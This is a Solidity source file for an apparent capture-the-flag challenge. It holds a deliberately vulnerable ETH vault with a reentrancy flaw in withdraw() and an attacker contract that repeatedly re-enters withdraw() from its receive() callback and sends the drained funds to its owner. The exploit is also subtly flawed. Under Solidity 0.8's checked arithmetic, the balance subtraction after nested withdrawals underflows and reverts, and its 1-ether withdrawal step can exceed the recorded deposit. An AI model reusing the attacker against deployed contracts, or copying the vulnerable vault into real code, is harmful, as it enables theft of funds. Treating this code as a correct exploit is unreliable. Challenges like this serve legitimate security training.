// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
    CYBER ARENA
    Challenge: The Vulnerable Vault

    Vulnerability:
    Reentrancy in withdraw()

    The vault sends ETH before updating the user's balance.
    An attacker contract can therefore call withdraw() again
    from its receive() function before the balance is cleared.
*/

contract VulnerableVault {

    mapping(address => uint256) public balances;

    address public owner;

    bool public vaultDrained;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event VaultCompromised(address indexed attacker);

    constructor() payable {
        owner = msg.sender;
    }

    function deposit() external payable {

        require(
            msg.value > 0,
            "Deposit must be greater than zero"
        );

        balances[msg.sender] += msg.value;

        emit Deposit(
            msg.sender,
            msg.value
        );
    }

    function withdraw(uint256 amount) external {

        require(
            balances[msg.sender] >= amount,
            "Insufficient balance"
        );

        /*
            INTENTIONAL VULNERABILITY

            ETH is sent BEFORE the balance is updated.

            This allows a malicious contract to re-enter
            withdraw() through its receive() function.
        */

        (bool success, ) = msg.sender.call{
            value: amount
        }("");

        require(
            success,
            "Transfer failed"
        );

        // Vulnerable state update
        balances[msg.sender] -= amount;

        emit Withdrawal(
            msg.sender,
            amount
        );

        if (address(this).balance == 0) {

            vaultDrained = true;

            emit VaultCompromised(
                msg.sender
            );
        }
    }

    function getVaultBalance()
        external
        view
        returns (uint256)
    {
        return address(this).balance;
    }

    receive() external payable {}
}


/*
    ATTACK CONTRACT

    Deploy this after deploying VulnerableVault.

    The attacker deposits a small amount and repeatedly
    calls withdraw() during the fallback/receive callback.
*/

contract VaultAttacker {

    VulnerableVault public vault;

    address public owner;

    constructor(address payable _vault) {

        vault = VulnerableVault(
            _vault
        );

        owner = msg.sender;
    }

    function attack() external payable {

        require(
            msg.sender == owner,
            "Only attacker owner"
        );

        require(
            msg.value > 0,
            "Send ETH to start attack"
        );

        vault.deposit{
            value: msg.value
        }();

        vault.withdraw(
            msg.value
        );
    }

    receive() external payable {

        uint256 vaultBalance =
            address(vault).balance;

        if (vaultBalance > 0) {

            uint256 amount =
                vaultBalance < 1 ether
                ? vaultBalance
                : 1 ether;

            vault.withdraw(
                amount
            );
        }
    }

    function collect() external {

        require(
            msg.sender == owner,
            "Only attacker owner"
        );

        payable(owner).transfer(
            address(this).balance
        );
    }

    function getBalance()
        external
        view
        returns (uint256)
    {
        return address(this).balance;
    }
}